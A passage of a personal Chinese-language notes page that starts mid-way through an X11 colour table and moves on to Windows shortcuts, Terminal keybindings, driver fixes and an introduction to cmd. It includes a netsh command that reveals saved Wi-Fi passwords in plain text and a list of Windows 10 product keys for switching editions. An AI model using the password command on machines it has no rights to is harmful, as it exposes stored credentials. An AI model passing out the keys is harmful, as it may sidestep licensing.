    <td style="background:rgb(238, 92, 66);"></td><td>Tomato2</td><td>238 92 66</td><td>#EE5C42</td>
   </tr>
   <tr>
    <td style="background:rgb(205, 183, 158);"></td><td>Bisque3</td><td>205 183 158</td><td>#CDB79E</td>
    <td style="background:rgb(205, 79, 57);"></td><td>Tomato3</td><td>205 79 57</td><td>#CD4F39</td>
   </tr>
   <tr>
    <td style="background:rgb(139, 125, 107);"></td><td>Bisque4</td><td>139 125 107</td><td>#8B7D6B</td>
    <td style="background:rgb(139, 54, 38);"></td><td>Tomato4</td><td>139 54 38</td><td>#8B3626</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 218, 185);"></td><td>PeachPuff1</td><td>255 218 185</td><td>#FFDAB9</td>
    <td style="background:rgb(255, 69, 0);"></td><td>OrangeRed1</td><td>255 69 0</td><td>#FF4500</td>
   </tr>
   <tr>
    <td style="background:rgb(238, 203, 173);"></td><td>PeachPuff2</td><td>238 203 173</td><td>#EECBAD</td>
    <td style="background:rgb(238, 64, 0);"></td><td>OrangeRed2</td><td>238 64 0</td><td>#EE4000</td>
   </tr>
   <tr>
    <td style="background:rgb(205, 175, 149);"></td><td>PeachPuff3</td><td>205 175 149</td><td>#CDAF95</td>
    <td style="background:rgb(205, 55, 0);"></td><td>OrangeRed3</td><td>205 55 0</td><td>#CD3700</td>
   </tr>
   <tr>
    <td style="background:rgb(139, 119, 101);"></td><td>PeachPuff4</td><td>139 119 101</td><td>#8B7765</td>
    <td style="background:rgb(139, 37, 0);"></td><td>OrangeRed4</td><td>139 37 0</td><td>#8B2500</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 222, 173);"></td><td>NavajoWhite1</td><td>255 222 173</td><td>#FFDEAD</td>
    <td style="background:rgb(255, 0, 0);"></td><td>Red1</td><td>255 0 0</td><td>#FF0000</td>
   </tr>
   <tr>
    <td style="background:rgb(238, 207, 161);"></td><td>NavajoWhite2</td><td>238 207 161</td><td>#EECFA1</td>
    <td style="background:rgb(238, 0, 0);"></td><td>Red2</td><td>238 0 0</td><td>#EE0000</td>
   </tr>
   <tr>
    <td style="background:rgb(205, 179, 139);"></td><td>NavajoWhite3</td><td>205 179 139</td><td>#CDB38B</td>
    <td style="background:rgb(205, 0, 0);"></td><td>Red3</td><td>205 0 0</td><td>#CD0000</td>
   </tr>
   <tr>
    <td style="background:rgb(139, 121, 94);"></td><td>NavajoWhite4</td><td>139 121 94</td><td>#8B795E</td>
    <td style="background:rgb(139, 0, 0);"></td><td>Red4</td><td>139 0 0</td><td>#8B0000</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 250, 205);"></td><td>LemonChiffon1</td><td>255 250 205</td><td>#FFFACD</td>
    <td style="background:rgb(255, 20, 147);"></td><td>DeepPink1</td><td>255 20 147</td><td>#FF1493</td>
   </tr>
   <tr>
    <td style="background:rgb(238, 233, 191);"></td><td>LemonChiffon2</td><td>238 233 191</td><td>#EEE9BF</td>
    <td style="background:rgb(238, 18, 137);"></td><td>DeepPink2</td><td>238 18 137</td><td>#EE1289</td>
   </tr>
   <tr>
    <td style="background:rgb(205, 201, 165);"></td><td>LemonChiffon3</td><td>205 201 165</td><td>#CDC9A5</td>
    <td style="background:rgb(205, 16, 118);"></td><td>DeepPink3</td><td>205 16 118</td><td>#CD1076</td>
   </tr>
   <tr>
    <td style="background:rgb(139, 137, 112);"></td><td>LemonChiffon4</td><td>139 137 112</td><td>#8B8970</td>
    <td style="background:rgb(139, 10, 80);"></td><td>DeepPink4</td><td>139 10 80</td><td>#8B0A50</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 248, 220);"></td><td>Cornsilk1</td><td>255 248 220</td><td>#FFF8DC</td>
    <td style="background:rgb(255, 110, 180);"></td><td>HotPink1</td><td>255 110 180</td><td>#FF6EB4</td>
   </tr>
   <tr>
    <td style="background:rgb(238, 232, 205);"></td><td>Cornsilk2</td><td>238 232 205</td><td>#EEE8CD</td>
    <td style="background:rgb(238, 106, 167);"></td><td>HotPink2</td><td>238 106 167</td><td>#EE6AA7</td>
   </tr>
   <tr>
    <td style="background:rgb(205, 200, 177);"></td><td>Cornsilk3</td><td>205 200 177</td><td>#CDC8B1</td>
    <td style="background:rgb(205, 96, 144);"></td><td>HotPink3</td><td>205 96 144</td><td>#CD6090</td>
   </tr>
   <tr>
    <td style="background:rgb(139, 136, 120);"></td><td>Cornsilk4</td><td>139 136 120</td><td>#8B8878</td>
    <td style="background:rgb(139, 58, 98);"></td><td>HotPink4</td><td>139 58 98</td><td>#8B3A62</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 255, 240);"></td><td>Ivory1</td><td>255 255 240</td><td>#FFFFF0</td>
    <td style="background:rgb(255, 181, 197);"></td><td>Pink1</td><td>255 181 197</td><td>#FFB5C5</td>
   </tr>
   <tr>
    <td style="background:rgb(238, 238, 224);"></td><td>Ivory2</td><td>238 238 224</td><td>#EEEEE0</td>
    <td style="background:rgb(238, 169, 184);"></td><td>Pink2</td><td>238 169 184</td><td>#EEA9B8</td>
   </tr>
   <tr>
    <td style="background:rgb(205, 205, 193);"></td><td>Ivory3</td><td>205 205 193</td><td>#CDCDC1</td>
    <td style="background:rgb(205, 145, 158);"></td><td>Pink3</td><td>205 145 158</td><td>#CD919E</td>
   </tr>
   <tr>
    <td style="background:rgb(139, 139, 131);"></td><td>Ivory4</td><td>139 139 131</td><td>#8B8B83</td>
    <td style="background:rgb(139, 99, 108);"></td><td>Pink4</td><td>139 99 108</td><td>#8B636C</td>
   </tr>
   <tr>
    <td style="background:rgb(240, 255, 240);"></td><td>Honeydew1</td><td>240 255 240</td><td>#F0FFF0</td>
    <td style="background:rgb(255, 174, 185);"></td><td>LightPink1</td><td>255 174 185</td><td>#FFAEB9</td>
   </tr>
   <tr>
    <td style="background:rgb(224, 238, 224);"></td><td>Honeydew2</td><td>224 238 224</td><td>#E0EEE0</td>
    <td style="background:rgb(238, 162, 173);"></td><td>LightPink2</td><td>238 162 173</td><td>#EEA2AD</td>
   </tr>
   <tr>
    <td style="background:rgb(193, 205, 193);"></td><td>Honeydew3</td><td>193 205 193</td><td>#C1CDC1</td>
    <td style="background:rgb(205, 140, 149);"></td><td>LightPink3</td><td>205 140 149</td><td>#CD8C95</td>
   </tr>
   <tr>
    <td style="background:rgb(131, 139, 131);"></td><td>Honeydew4</td><td>131 139 131</td><td>#838B83</td>
    <td style="background:rgb(139, 95, 101);"></td><td>LightPink4</td><td>139 95 101</td><td>#8B5F65</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 240, 245);"></td><td>LavenderBlush1</td><td>255 240 245</td><td>#FFF0F5</td>
    <td style="background:rgb(255, 130, 171);"></td><td>PaleVioletRed1</td><td>255 130 171</td><td>#FF82AB</td>
   </tr>
   <tr>
    <td style="background:rgb(238, 224, 229);"></td><td>LavenderBlush2</td><td>238 224 229</td><td>#EEE0E5</td>
    <td style="background:rgb(238, 121, 159);"></td><td>PaleVioletRed2</td><td>238 121 159</td><td>#EE799F</td>
   </tr>
   <tr>
    <td style="background:rgb(205, 193, 197);"></td><td>LavenderBlush3</td><td>205 193 197</td><td>#CDC1C5</td>
    <td style="background:rgb(205, 104, 137);"></td><td>PaleVioletRed3</td><td>205 104 137</td><td>#CD6889</td>
   </tr>
   <tr>
    <td style="background:rgb(139, 131, 134);"></td><td>LavenderBlush4</td><td>139 131 134</td><td>#8B8386</td>
    <td style="background:rgb(139, 71, 93);"></td><td>PaleVioletRed4</td><td>139 71 93</td><td>#8B475D</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 228, 225);"></td><td>MistyRose1</td><td>255 228 225</td><td>#FFE4E1</td>
    <td style="background:rgb(255, 52, 179);"></td><td>Maroon1</td><td>255 52 179</td><td>#FF34B3</td>
   </tr>
   <tr>
    <td style="background:rgb(238, 213, 210);"></td><td>MistyRose2</td><td>238 213 210</td><td>#EED5D2</td>
    <td style="background:rgb(238, 48, 167);"></td><td>Maroon2</td><td>238 48 167</td><td>#EE30A7</td>
   </tr>
   <tr>
    <td style="background:rgb(205, 183, 181);"></td><td>MistyRose3</td><td>205 183 181</td><td>#CDB7B5</td>
    <td style="background:rgb(205, 41, 144);"></td><td>Maroon3</td><td>205 41 144</td><td>#CD2990</td>
   </tr>
   <tr>
    <td style="background:rgb(139, 125, 123);"></td><td>MistyRose4</td><td>139 125 123</td><td>#8B7D7B</td>
    <td style="background:rgb(139, 28, 98);"></td><td>Maroon4</td><td>139 28 98</td><td>#8B1C62</td>
   </tr>
   <tr>
    <td style="background:rgb(240, 255, 255);"></td><td>Azure1</td><td>240 255 255</td><td>#F0FFFF</td>
    <td style="background:rgb(255, 62, 150);"></td><td>VioletRed1</td><td>255 62 150</td><td>#FF3E96</td>
   </tr>
   <tr>
    <td style="background:rgb(224, 238, 238);"></td><td>Azure2</td><td>224 238 238</td><td>#E0EEEE</td>
    <td style="background:rgb(238, 58, 140);"></td><td>VioletRed2</td><td>238 58 140</td><td>#EE3A8C</td>
   </tr>
   <tr>
    <td style="background:rgb(193, 205, 205);"></td><td>Azure3</td><td>193 205 205</td><td>#C1CDCD</td>
    <td style="background:rgb(205, 50, 120);"></td><td>VioletRed3</td><td>205 50 120</td><td>#CD3278</td>
   </tr>
   <tr>
    <td style="background:rgb(131, 139, 139);"></td><td>Azure4</td><td>131 139 139</td><td>#838B8B</td>
    <td style="background:rgb(139, 34, 82);"></td><td>VioletRed4</td><td>139 34 82</td><td>#8B2252</td>
   </tr>
   <tr>
    <td style="background:rgb(131, 111, 255);"></td><td>SlateBlue1</td><td>131 111 255</td><td>#836FFF</td>
    <td style="background:rgb(255, 0, 255);"></td><td>Magenta1</td><td>255 0 255</td><td>#FF00FF</td>
   </tr>
   <tr>
    <td style="background:rgb(122, 103, 238);"></td><td>SlateBlue2</td><td>122 103 238</td><td>#7A67EE</td>
    <td style="background:rgb(238, 0, 238);"></td><td>Magenta2</td><td>238 0 238</td><td>#EE00EE</td>
   </tr>
   <tr>
    <td style="background:rgb(105, 89, 205);"></td><td>SlateBlue3</td><td>105 89 205</td><td>#6959CD</td>
    <td style="background:rgb(205, 0, 205);"></td><td>Magenta3</td><td>205 0 205</td><td>#CD00CD</td>
   </tr>
   <tr>
    <td style="background:rgb(71, 60, 139);"></td><td>SlateBlue4</td><td>71 60 139</td><td>#473C8B</td>
    <td style="background:rgb(139, 0, 139);"></td><td>Magenta4</td><td>139 0 139</td><td>#8B008B</td>
   </tr>
   <tr>
    <td style="background:rgb(72, 118, 255);"></td><td>RoyalBlue1</td><td>72 118 255</td><td>#4876FF</td>
    <td style="background:rgb(255, 131, 250);"></td><td>Orchid1</td><td>255 131 250</td><td>#FF83FA</td>
   </tr>
   <tr>
    <td style="background:rgb(67, 110, 238);"></td><td>RoyalBlue2</td><td>67 110 238</td><td>#436EEE</td>
    <td style="background:rgb(238, 122, 233);"></td><td>Orchid2</td><td>238 122 233</td><td>#EE7AE9</td>
   </tr>
   <tr>
    <td style="background:rgb(58, 95, 205);"></td><td>RoyalBlue3</td><td>58 95 205</td><td>#3A5FCD</td>
    <td style="background:rgb(205, 105, 201);"></td><td>Orchid3</td><td>205 105 201</td><td>#CD69C9</td>
   </tr>
   <tr>
    <td style="background:rgb(39, 64, 139);"></td><td>RoyalBlue4</td><td>39 64 139</td><td>#27408B</td>
    <td style="background:rgb(139, 71, 137);"></td><td>Orchid4</td><td>139 71 137</td><td>#8B4789</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 0, 255);"></td><td>Blue1</td><td>0 0 255</td><td>#0000FF</td>
    <td style="background:rgb(255, 187, 255);"></td><td>Plum1</td><td>255 187 255</td><td>#FFBBFF</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 0, 238);"></td><td>Blue2</td><td>0 0 238</td><td>#0000EE</td>
    <td style="background:rgb(238, 174, 238);"></td><td>Plum2</td><td>238 174 238</td><td>#EEAEEE</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 0, 205);"></td><td>Blue3</td><td>0 0 205</td><td>#0000CD</td>
    <td style="background:rgb(205, 150, 205);"></td><td>Plum3</td><td>205 150 205</td><td>#CD96CD</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 0, 139);"></td><td>Blue4</td><td>0 0 139</td><td>#00008B</td>
    <td style="background:rgb(139, 102, 139);"></td><td>Plum4</td><td>139 102 139</td><td>#8B668B</td>
   </tr>
   <tr>
    <td style="background:rgb(30, 144, 255);"></td><td>DodgerBlue1</td><td>30 144 255</td><td>#1E90FF</td>
    <td style="background:rgb(224, 102, 255);"></td><td>MediumOrchid1</td><td>224 102 255</td><td>#E066FF</td>
   </tr>
   <tr>
    <td style="background:rgb(28, 134, 238);"></td><td>DodgerBlue2</td><td>28 134 238</td><td>#1C86EE</td>
    <td style="background:rgb(209, 95, 238);"></td><td>MediumOrchid2</td><td>209 95 238</td><td>#D15FEE</td>
   </tr>
   <tr>
    <td style="background:rgb(24, 116, 205);"></td><td>DodgerBlue3</td><td>24 116 205</td><td>#1874CD</td>
    <td style="background:rgb(180, 82, 205);"></td><td>MediumOrchid3</td><td>180 82 205</td><td>#B452CD</td>
   </tr>
   <tr>
    <td style="background:rgb(16, 78, 139);"></td><td>DodgerBlue4</td><td>16 78 139</td><td>#104E8B</td>
    <td style="background:rgb(122, 55, 139);"></td><td>MediumOrchid4</td><td>122 55 139</td><td>#7A378B</td>
   </tr>
   <tr>
    <td style="background:rgb(99, 184, 255);"></td><td>SteelBlue1</td><td>99 184 255</td><td>#63B8FF</td>
    <td style="background:rgb(191, 62, 255);"></td><td>DarkOrchid1</td><td>191 62 255</td><td>#BF3EFF</td>
   </tr>
   <tr>
    <td style="background:rgb(92, 172, 238);"></td><td>SteelBlue2</td><td>92 172 238</td><td>#5CACEE</td>
    <td style="background:rgb(178, 58, 238);"></td><td>DarkOrchid2</td><td>178 58 238</td><td>#B23AEE</td>
   </tr>
   <tr>
    <td style="background:rgb(79, 148, 205);"></td><td>SteelBlue3</td><td>79 148 205</td><td>#4F94CD</td>
    <td style="background:rgb(154, 50, 205);"></td><td>DarkOrchid3</td><td>154 50 205</td><td>#9A32CD</td>
   </tr>
   <tr>
    <td style="background:rgb(54, 100, 139);"></td><td>SteelBlue4</td><td>54 100 139</td><td>#36648B</td>
    <td style="background:rgb(104, 34, 139);"></td><td>DarkOrchid4</td><td>104 34 139</td><td>#68228B</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 191, 255);"></td><td>DeepSkyBlue1</td><td>0 191 255</td><td>#00BFFF</td>
    <td style="background:rgb(155, 48, 255);"></td><td>Purple1</td><td>155 48 255</td><td>#9B30FF</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 178, 238);"></td><td>DeepSkyBlue2</td><td>0 178 238</td><td>#00B2EE</td>
    <td style="background:rgb(145, 44, 238);"></td><td>Purple2</td><td>145 44 238</td><td>#912CEE</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 154, 205);"></td><td>DeepSkyBlue3</td><td>0 154 205</td><td>#009ACD</td>
    <td style="background:rgb(125, 38, 205);"></td><td>Purple3</td><td>125 38 205</td><td>#7D26CD</td>
   </tr>
   <tr>
    <td style="background:rgb(0, 104, 139);"></td><td>DeepSkyBlue4</td><td>0 104 139</td><td>#00688B</td>
    <td style="background:rgb(85, 26, 139);"></td><td>Purple4</td><td>85 26 139</td><td>#551A8B</td>
   </tr>
   <tr>
    <td style="background:rgb(135, 206, 255);"></td><td>SkyBlue1</td><td>135 206 255</td><td>#87CEFF</td>
    <td style="background:rgb(171, 130, 255);"></td><td>MediumPurple1</td><td>171 130 255</td><td>#AB82FF</td>
   </tr>
   <tr>
    <td style="background:rgb(126, 192, 238);"></td><td>SkyBlue2</td><td>126 192 238</td><td>#7EC0EE</td>
    <td style="background:rgb(159, 121, 238);"></td><td>MediumPurple2</td><td>159 121 238</td><td>#9F79EE</td>
   </tr>
   <tr>
    <td style="background:rgb(108, 166, 205);"></td><td>SkyBlue3</td><td>108 166 205</td><td>#6CA6CD</td>
    <td style="background:rgb(137, 104, 205);"></td><td>MediumPurple3</td><td>137 104 205</td><td>#8968CD</td>
   </tr>
   <tr>
    <td style="background:rgb(74, 112, 139);"></td><td>SkyBlue4</td><td>74 112 139</td><td>#4A708B</td>
    <td style="background:rgb(93, 71, 139);"></td><td>MediumPurple4</td><td>93 71 139</td><td>#5D478B</td>
   </tr>
   <tr>
    <td style="background:rgb(176, 226, 255);"></td><td>LightSkyBlue1</td><td>176 226 255</td><td>#B0E2FF</td>
    <td style="background:rgb(255, 225, 255);"></td><td>Thistle1</td><td>255 225 255</td><td>#FFE1FF</td>
   </tr>
   <tr>
    <td style="background:rgb(164, 211, 238);"></td><td>LightSkyBlue2</td><td>164 211 238</td><td>#A4D3EE</td>
    <td style="background:rgb(238, 210, 238);"></td><td>Thistle2</td><td>238 210 238</td><td>#EED2EE</td>
   </tr>
   <tr>
    <td style="background:rgb(141, 182, 205);"></td><td>LightSkyBlue3</td><td>141 182 205</td><td>#8DB6CD</td>
    <td style="background:rgb(205, 181, 205);"></td><td>Thistle3</td><td>205 181 205</td><td>#CDB5CD</td>
   </tr>
   <tr>
    <td style="background:rgb(96, 123, 139);"></td><td>LightSkyBlue4</td><td>96 123 139</td><td>#607B8B</td>
    <td style="background:rgb(139, 123, 139);"></td><td>Thistle4</td><td>139 123 139</td><td>#8B7B8B</td>
   </tr>
   <tr>
    <td style="background:rgb(198, 226, 255);"></td><td>SlateGray1</td><td>198 226 255</td><td>#C6E2FF</td>
    <td style="background:rgb(28, 28, 28);"></td><td>grey11</td><td>28 28 28</td><td>#1C1C1C</td>
   </tr>
   <tr>
    <td style="background:rgb(185, 211, 238);"></td><td>SlateGray2</td><td>185 211 238</td><td>#B9D3EE</td>
    <td style="background:rgb(54, 54, 54);"></td><td>grey21</td><td>54 54 54</td><td>#363636</td>
   </tr>
   <tr>
    <td style="background:rgb(159, 182, 205);"></td><td>SlateGray3</td><td>159 182 205</td><td>#9FB6CD</td>
    <td style="background:rgb(79, 79, 79);"></td><td>grey31</td><td>79 79 79</td><td>#4F4F4F</td>
   </tr>
   <tr>
    <td style="background:rgb(108, 123, 139);"></td><td>SlateGray4</td><td>108 123 139</td><td>#6C7B8B</td>
    <td style="background:rgb(105, 105, 105);"></td><td>grey41</td><td>105 105 105</td><td>#696969</td>
   </tr>
   <tr>
    <td style="background:rgb(202, 225, 255);"></td><td>LightSteelBlue1</td><td>202 225 255</td><td>#CAE1FF</td>
    <td style="background:rgb(130, 130, 130);"></td><td>grey51</td><td>130 130 130</td><td>#828282</td>
   </tr>
   <tr>
    <td style="background:rgb(188, 210, 238);"></td><td>LightSteelBlue2</td><td>188 210 238</td><td>#BCD2EE</td>
    <td style="background:rgb(156, 156, 156);"></td><td>grey61</td><td>156 156 156</td><td>#9C9C9C</td>
   </tr>
   <tr>
    <td style="background:rgb(162, 181, 205);"></td><td>LightSteelBlue3</td><td>162 181 205</td><td>#A2B5CD</td>
    <td style="background:rgb(181, 181, 181);"></td><td>grey71</td><td>181 181 181</td><td>#B5B5B5</td>
   </tr>
   <tr>
    <td style="background:rgb(110, 123, 139);"></td><td>LightSteelBlue4</td><td>110 123 139</td><td>#6E7B8B</td>
    <td style="background:rgb(207, 207, 207);"></td><td>gray81</td><td>207 207 207</td><td>#CFCFCF</td>
   </tr>
   <tr>
    <td style="background:rgb(191, 239, 255);"></td><td>LightBlue1</td><td>191 239 255</td><td>#BFEFFF</td>
    <td style="background:rgb(232, 232, 232);"></td><td>gray91</td><td>232 232 232</td><td>#E8E8E8</td>
   </tr>
   <tr>
    <td style="background:rgb(178, 223, 238);"></td><td>LightBlue2</td><td>178 223 238</td><td>#B2DFEE</td>
    <td style="background:rgb(169, 169, 169);"></td><td>DarkGrey</td><td>169 169 169</td><td>#A9A9A9</td>
   </tr>
   <tr>
    <td style="background:rgb(154, 192, 205);"></td><td>LightBlue3</td><td>154 192 205</td><td>#9AC0CD</td>
    <td style="background:rgb(0, 0, 139);"></td><td>DarkBlue</td><td>0 0 139</td><td>#00008B</td>
   </tr>
   <tr>
    <td style="background:rgb(104, 131, 139);"></td><td>LightBlue4</td><td>104 131 139</td><td>#68838B</td>
    <td style="background:rgb(0, 139, 139);"></td><td>DarkCyan</td><td>0 139 139</td><td>#008B8B</td>
   </tr>
   <tr>
    <td style="background:rgb(224, 255, 255);"></td><td>LightCyan1</td><td>224 255 255</td><td>#E0FFFF</td>
    <td style="background:rgb(139, 0, 139);"></td><td>DarkMagenta</td><td>139 0 139</td><td>#8B008B</td>
   </tr>
   <tr>
    <td style="background:rgb(209, 238, 238);"></td><td>LightCyan2</td><td>209 238 238</td><td>#D1EEEE</td>
    <td style="background:rgb(139, 0, 0);"></td><td>DarkRed</td><td>139 0 0</td><td>#8B0000</td>
   </tr>
   <tr>
    <td style="background:rgb(180, 205, 205);"></td><td>LightCyan3</td><td>180 205 205</td><td>#B4CDCD</td>
    <td></td>
   </tr>
   <tr>
    <td style="background:rgb(122, 139, 139);"></td><td>LightCyan4</td><td>122 139 139</td><td>#7A8B8B</td>
    <td style="background:rgb(144, 238, 144);"></td><td>LightGreen</td><td>144 238 144</td><td>#90EE90</td>
   </tr>
</table>
</div>

<div id="win">
<h2>windows操作</h2><pre>
Fn+功能键:切换功能键和F系列键
F1:快速获取Windows的帮助信息
F2:选择文件后按下F2键进行重命名
F3:快速弹出搜索窗口
F4:Alt＋F4关闭当前窗口
F5:刷新IE浏览器或资源管理器。
F6:在IE浏览器或资源管理器中定位到地址栏。
F7:在DOS窗口中却很有用。
F8:在启动电脑时可以用这个快捷键来显示启动菜单。
F9:调低Windows Media Player的播放音量。
F10:Shift＋F10显示右键的快捷菜单,在Windows Media Player中可以用来调高播放音量。
F11:全屏显示当前的IE浏览器页面或资源管理器。
F12:在Word中可以快速弹出另存为窗口,也IE开发必备神器。

win             开始菜单
win+数字        切换到任务栏对应的应用
ALT+ESC         切换任务栏对应的应用
Alt+Tab         任务视图切换,切换程序
ctrl+Tab    切换选项卡如网页
win+E           打开资源管理器 explorer.exe
win+R           运行
win+D           切换显示桌面
win+M           最小化所有窗口
win+pause break 打开系统属性对话框
win++/_         打开win放大缩小功能
win+L           锁屏
win+<-/->       当前窗口在屏幕左右侧显示
win+上下键      当前窗口最大化最小化
win+T           多次按可以多个程序切换
win+F           搜索计算机
backspace       删除/返回上一页
Win+Shift+S     截图
prtsc           截图,在F12旁边[Print Screen SysRq]键
win + prtsc     截图到此电脑-图片
Win+V           剪切板
键盘右下角Alt键与Ctrl键之间的键叫做菜单键,相对于鼠标右键

虚拟桌面
开启: Win+Ctrl+D新建桌面
查看: win + tab打开时间轴,可重命名
切换桌面: Ctrl+Win+左右方向键
关闭当前虚拟桌面: Win+Ctrl+F4

win+g开启录屏截图工具,可以调节音量,查看电脑运行性能
或者直接Win+Alt+R录制
保存地址: C:\Users\lenovo\Videos\Captures
开启: 设置->游戏->使用游戏栏录制游戏剪辑、屏幕截图和广播

抖动窗口
当桌面上开启了很多个窗口,想要全部都最小化,只保留一个当前使用的窗口,那么可以在这个窗口顶端长按鼠标左右快速抖动。瞬间还你一个干净整洁的桌面,心情也会变得愉快了,如果想恢复最小化的窗口,再次左右快速抖动,之前打开的窗口久又回来了。

ctrl+A   全选
ctrl+C   复制
ctrl+x   剪切
ctrl+V   粘贴
ctrl+Z   撤销
ctrl+D   收藏当期web页
ctrl+F   查找
ctrl+N   office、ps、浏览器等新建文件窗口
ctrl+O   打开文件
ctrl+S   保存
ctrl+p   打印
ctrl+R   刷新
ctrl+W   关闭当前窗口或tab
ctrl+shift+t 打开最近关闭的tab
ctrl+U       加下划线,浏览器可打开网页源代码
ctrl+ESC     开始菜单,相当于win
ctrl+shift   切换输入法
ctrl+Alt+A   QQ截屏
ctrl+Home   光标快速移动到文件头
ctrl+End    光标快速移动到文件尾
ctrl+Shift+< 快速缩小文字
ctrl+Shift+> 快速放大文字

Alt+空格    还原移动小窗口
Alt+F       打开文件菜单
Alt+V       打开视图菜单
Alt+E       打开编辑菜单
Alt+I       打开插入菜单
Alt+O       打开格式菜单
Alt+T       打开工具菜单
Alt+A       打开表格菜单
Alt+W       打开窗口菜单
Alt+H       打开帮助菜单
Alt+Enter   查看文件属性
Alt+双击    查看文件属性
Alt+F4      关闭当前程序
Alt+空格+C  关闭窗口
Alt+空格+N  最小化当前窗口
Alt+空格+R  恢复最小化窗口
Alt+空格+X  最大化当前窗口
Alt+空格+M  移动窗口

ctrl+shift+n 新建文件夹2
选中多个文件夹+F2+[ctrl+enter]批量命名

word文档随机产生文章,输入=rand(3,10)回车,3段每段10行

ctrl+shift+z搜狗输入符号大全?

firebug:ctrl+shift+c

文件夹空白处按住shift键+鼠标右键选择'在此处打开命令窗口'
文件上按住shift键+鼠标右键选择'复制为路径'

win10专业版
计算机 -> 属性 -> 更换密钥
win10中文家庭版 -> win10专业版:FMPND-XFTD4-67FJC-HDR8C-3YH26
VK7JG-NPHTM-C97JM-9MPGT-3V66T
4N7JM-CV98F-WY9XX-9D8CF-369TT
M7XTQ-FN8P6-TTKYV-9D4CC-J462D (企业版?)

win10自动掉线之后无法连接到网络
无线适配器->属性->配置->驱动程序->更新驱动程序->浏览我的计算机以查找驱动软件->让我从计算机上的可用驱动程序列表中选取->qualcomm atheros ar956x wireless network adapter(qualcomm atheros communications inc)->安装之后即可自动连接网络
无线适配器->属性->配置->驱动程序->电源管理->不允许计算机关闭此设备以节约电源

查看已连接的wifimima
网络共享 -> wlan状态 -> 无线属性
netsh wlan show profile ssid-name key=clear

【 删除文件操作失败,其中的文件在另一个程序中打开 】
任务管理器 -> 性能 -> 关联的句柄 -> 搜索 -> 结束进程

【 ssh服务 】
win10->设置->应用与功能->管理可选功能->ssh客户端->添加功能->ssh服务端

【 局域网 】
计算机全名 LAPTOP-0KMQM01D
工作组     WORKGROUP

ping 局域网IP
ping 局域网计算机全名

【 Windows Terminal 】
microsoft store
MS Terminal支持Command Prompt和PowerShell的所有优点,基本上命令行已经可以和Linux相融合了,除此之外运行命令提示符也是没问题的
MS Terminal开源地址:https://github.com/microsoft/terminal
win+r -> wt
wt -d .   地址栏进入当前目录

👉
鼠标左键选中,右键复制,右键粘贴
zoom can be changed by holding Ctrl and scrolling with mouse
Background opacity can be changed by holding Ctrl+Shift and scrolling with mouse
ctrl+home 清除光标左侧
ctrl+end  清除光标右侧
ctrl+->   光标移动到下一个单词

splitPane alt+shift+- alt+shift+plus
moveFocus alt+->
closePane ctrl+shift+w

newTab ctrl+shift+1  ⌵第一个cmd
newTab ctrl+shift+t  相同cmd
nextTab ctrl+tab
prevTab ctrl+shift+tab
toggleFullscreen alt+enter/f11

scrollDown ctrl+shift+down
scrollDownPage ctrl+shift+pgdn
scrollUp ctrl+shift+up
scrollUpPage ctrl+shift+pgup"

【 u盘换图标 】
autorun.inf
[autorun]
icon=30[1].ico
隐藏inf文件

【 搜索引擎查询技巧 】
1、普通查询:提示相关结果的个数
2、加双引号
3、加空格:与
4、通配符:* ？,如1英寸=？厘米
5、布尔检索:and or not near
6、加圆括号:不会被拆分,当作一个词语来查询
7、加加号减号:网页内容中必须包含的关键词,而不仅仅是标题,如+京东+采销,苹果手机-(iphone5)
8、inurl:sohu
9、intitle:标题:搜索范围限定在网页标题中
10、site:域名或网站名:限定网站搜索方式,查看网站收录情况,如site:.top
11、filetype:doc 生物:专业文档搜索
12、metawords元词检索:title:生物  domain:top  image:美女  link:lberlin.top链接到选定网站的页面  URL:lberlin检索地址栏中包含关键词的网页

</pre>
</div>

<div id="cmd">
<h3> cmd 命令行 命令提示符command </h3>
<a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/windows-commands">dos命令大全</a><pre>
【 命令外壳 】
命令行界面是Windows中内置的第一个shell,用批处理(.bat)文件自动完成日常任务,如用户帐户管理或夜间备份。借助Windows脚本宿主可以在命令行界面中运行更复杂的脚本。使用脚本可以更有效地执行操作,而不是使用用户界面。 脚本接受命令行中可用的所有命令。

Windows有两个命令shell:命令行界面和PowerShell。
每个shell是一种软件程序,它提供与操作系统或应用程序之间的直接通信,同时提供用于自动执行IT操作的环境。
PowerShell旨在扩展命令行界面的功能,以运行称为cmdlet的PowerShell命令,Cmdlet类似于Windows命令,但提供更可扩展的脚本语言。 可以在Powershell中运行Windows命令和PowerShell cmdlet,但命令shell只能运行Windows命令,而不能运行PowerShell cmdlet。
对于最新的Windows automation(自动化)最新功能,建议使用PowerShell,而不是Windows命令或windows脚本宿主来实现Windows automation

提示符程序不是纯DOS系统,是Windows操作系统的一部分,执行部分DOS系统所拥有的功能
win+R -> cmd

CMD命令行,Mac和Linux系统一般是称为终端

DOS(Disk Operating System)是一个使用得十分广泛的磁盘操作系统,就连眼下流行的Windows9x/ME系统都是以它为基础。
常见的DOS有两种:IBM公司的PC-DOS和微软公司的MS-DOS,它们的功能、命令用途格式都相同,常用的是MS-DOS

DOS命令分为内部命令和外部命令(dos命名不区分大小写), 内部命令是随每次启动的cmd.exe装入并常驻内存,而外部命令是一条单独的可执行文件。内部命令在任何时候都可以使用,而外部命令需要保证命令文件在它所在的目录中或在Autoexec.bat文件已经被加载了路径。

内部命令是指在DOS启动之后自动通过command.com文件导入内存的命令,在执行这些命令的时候直接从内存进行调用
常用的内部命令有MD、CD、RD、DIR、PATH、COPY、TYPE、EDIT、REN、DEL、CLS、VER、DATE、TIME、PROMPT。

外部命令就是一些应用程序,能够使用户的操作更加方便和深入。这些外部命令都是以文件的形式存在,Windows系统的DOS外部命令保存在Windwos主目录下的"Command"目录中
常用的外部命令有DELTREE、FORMAT、DISKCOPY、LABEL、VOL、SYS、XCOPY、FC、ATTRIB、MEM、TREE

命令行语法项
不带方括号或大括号的文本  必须按如下所示键入项
